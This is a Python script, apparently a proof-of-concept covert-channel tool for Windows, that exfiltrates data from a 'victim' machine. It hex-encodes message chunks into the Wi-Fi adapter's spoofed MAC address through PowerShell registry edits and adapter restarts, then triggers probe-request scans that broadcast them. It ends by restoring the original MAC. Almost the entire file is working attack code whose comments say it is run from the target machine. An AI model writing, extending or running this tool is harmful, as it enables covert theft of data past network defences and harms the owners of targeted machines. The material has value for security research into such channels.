import subprocess
import time
import pywifi

def return_mac_to_normal():
    # Define your PowerShell commands
    commands = [
        r'Set-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0005" -Name "NetworkAddress" -Value ""',
        r'Disable-NetAdapter -Name "Wi-Fi 2" -Confirm:$false',
        r'Enable-NetAdapter -Name "Wi-Fi 2" -Confirm:$false',
        r'Get-NetAdapter'
    ]

    # Combine commands into a single script
    ps_script = '; '.join(commands)

    # Run the PowerShell commands
    try:
        # Use subprocess to run PowerShell
        process = subprocess.Popen(['powershell.exe', '-Command', ps_script], 
                                   stdout=subprocess.PIPE, 
                                   stderr=subprocess.PIPE)

        # Get the output and error messages
        stdout, stderr = process.communicate()

        # Print output
        if stdout:
            print("Output:\n", stdout.decode('utf-8'))
        if stderr:
            print("Error:\n", stderr.decode('utf-8'))

    except Exception as e:
        print(f"An error occurred: {e}")

def exfiltrate(msg):
    # Define your PowerShell commands
    commands = [
        r'Set-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}\0005" -Name "NetworkAddress" -Value "' + msg +'"',
        r'Disable-NetAdapter -Name "Wi-Fi 2" -Confirm:$false',
        r'Enable-NetAdapter -Name "Wi-Fi 2" -Confirm:$false',
        r'Get-NetAdapter'
    ]

    # Combine commands into a single script
    ps_script = '; '.join(commands)

    # Run the PowerShell commands
    try:
        # Use subprocess to run PowerShell
        process = subprocess.Popen(['powershell.exe', '-Command', ps_script], 
                                   stdout=subprocess.PIPE, 
                                   stderr=subprocess.PIPE)

        # Get the output and error messages
        stdout, stderr = process.communicate()

        # Print output
        if stdout:
            print("Output:\n", stdout.decode('utf-8'))
        if stderr:
            print("Error:\n", stderr.decode('utf-8'))

    except Exception as e:
        print(f"An error occurred: {e}")

    #time.sleep(1)

    # Initialize the PyWiFi instance
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]  # Get the first wireless interface

    # Start scanning for networks
    iface.scan()
    time.sleep(2)  # Wait a moment for the scan to complete

    # Get the list of available networks
    #scan_results = iface.scan_results()

    # Iterate over the results and print SSIDs
    #for network in scan_results:
        #print(f"SSID: {network.ssid}")

    # Example: Filter networks based on some criteria (e.g., SSID contains 'Home')
    #wildcard_ssids = [network.ssid for network in scan_results if 'Home' in network.ssid]
    #print("Filtered SSIDs:", wildcard_ssids)
    
#exfiltrate("AABBCCDD1111") # message
#exfiltrate("AABBCCDD2222")
#exfiltrate("AABBCCDD3333")
#exfiltrate("AABBCCDD4444")


def encoder(message):
    hh = ""
    h = ''.join(hex(ord(c))[2:] for c in message)
    #print(h) #prints hex
    if len(message) < 7:
        hh = "AA" + h
        padding = 9 - len(h) + 1
        
        for o in range(0, padding):
            hh += "0"
    elif len(message) == 7:
        hh = "AA" + h
        #hh += "00" # Do not append
        
    print(hh)
    return hh

def packager(message):
    responses  = [(message[i:i+5]) for i in range(0, len(message), 5)]
    return responses
    
def neutrino_concentrator(message):
    responses = packager(message)
    for r in responses:
        rr = encoder(str(r))
        exfiltrate(rr)
        time.sleep(2) # increase time delay for accuracy

    
    print("Sent messages: " + str(responses))
    return_mac_to_normal()

message    = "Test message"
message2   = "This is a very long message"
message3   = "This message is exfiltrated via probe requests and the src mac of the victim"

# Run from target machine
neutrino_concentrator(message3)

#exfiltrate("AA7465737431")
#exfiltrate("AA77686F616D")
#exfiltrate("AA6900000000")

# structure of mac payload
# | ID | char | char | char | char | char | char | del |
#    0     1      2      3      4      5      6     7
#
# Two types of delimiters
# 99 - Start message
# 00 - end of message
# 0A - newline 
#
